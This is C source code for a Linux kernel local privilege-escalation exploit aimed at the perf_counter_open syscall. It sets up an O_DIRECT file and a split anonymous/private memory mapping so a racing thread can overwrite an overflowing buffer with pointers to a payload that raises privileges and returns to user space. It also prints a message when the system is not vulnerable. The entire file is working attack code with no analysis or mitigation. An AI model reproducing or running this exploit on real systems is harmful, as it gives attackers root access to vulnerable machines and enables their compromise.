#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <sched.h>
#include "kernel_header.h"

#undef __NR_perf_counter_open
#ifdef __x86_64__
#define __NR_perf_counter_open 298
#define BUF_SIZE 0x100
#else
#define __NR_perf_counter_open 336
#define BUF_SIZE 0x80
#endif

volatile long check=0;

struct perf_counter_attr {
  unsigned int type;
  unsigned int size;
};

static void kernel_payload()
{
  kernel_rise_privileges();
  return_to_userland();
}


static unsigned long prepare_mapping(const char* filestr)
{
  int fd,fd_odirect;
  char *anon_map, *private_map;
  unsigned long *val;


  fd_odirect = open(filestr, O_RDWR|O_DIRECT|O_CREAT, S_IRUSR|S_IWUSR);
  if(fd_odirect < 0)
    __fatal_errno(" [!!] open: O_DIRECT");

  
/* create anonymous+private file mapping for the following reasons:
  - this is the racer-buffer, it is composed by two pages: 
      the first page is created within an ANONYMOUS mapping, the second is a PRIVATE mapping on a file (which cache is kept away)
  - the start of the buffer is page aligned and can be used for writing into the O_DIRECT file descriptor
*/

  anon_map = mmap(NULL, _page_size*2, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
  if(anon_map == MAP_FAILED)
    __fatal_errno("[!!] mmap:  MAP_ANONYMOUS");

  memset(anon_map, 0x00, _page_size);

/* use anonymous aligned address to write into O_DIRECT fd */
   val = (unsigned long *)anon_map;

/* PAGE_SIZE is always multiple of disk block size */
  if(write(fd_odirect, val, _page_size) < 0)
    __fatal_errno("[!!] write: O_DIRECT");


  fd = open(filestr, O_RDWR);
  if(fd < 0)
    __fatal_errno("[!!] open: unable to open file");

  if(munmap(anon_map + _page_size, _page_size) < 0)
    __fatal_errno("[!!] munmap: unable to unmap");

/* avoid using MAP_FIXED which can create file-cache troubles */
  private_map = mmap(anon_map + _page_size, _page_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
  if(private_map == MAP_FAILED)
    __fatal_errno("[!!] mmap: MAP_PRIVATE");

  
#ifdef __KERNEL_DEBUG

 __msg_f("[**] Anonymous Map: %p, File Map: %p\n", anon_map, private_map);

#endif 


  return (unsigned long)private_map;
}


static volatile int racer=0;
static int racer_thread(void *buff)
{
  int total = (BUF_SIZE - sizeof(unsigned long)) / sizeof(unsigned long),i;  
  unsigned long *p_addr = buff;

  /* loop until race */
  while(!racer);
   check=1;
  for(i=0; i<total; i++)
    *(p_addr + i) = (unsigned long)kernel_payload;
  
  return 0;
}

#define MAP_FILE_NAME "./perfcount_bof_race"

int main(int argc, char *argv[])
{
  struct perf_counter_attr *ctr;
  unsigned long perf_count_struct_addr, racer_buffer;

  unlink(MAP_FILE_NAME);
  user_mode_set_env();

/* racer_buffer = private_map */
  racer_buffer = prepare_mapping(MAP_FILE_NAME);

  perf_count_struct_addr = racer_buffer - BUF_SIZE + sizeof(unsigned long)*9 - sizeof(struct perf_counter_attr);

  __msg_f("[**] perfcount struct addr: 0x%lx\n", perf_count_struct_addr);

  ctr = (struct perf_counter_attr *)(perf_count_struct_addr);

  start_thread(racer_thread, (void*)(perf_count_struct_addr + sizeof(struct perf_counter_attr)));
  sleep(2);

  ctr->size = BUF_SIZE;
  ctr->type = 0xFFFFFFFFUL;

  racer=1;
  if(syscall(__NR_perf_counter_open, ctr, getpid(), 0, 0, 0UL) < 0)
    __fatal_errno("[!!] perf_counter_open: failed, system is not vulnerable");

	return 0;
}

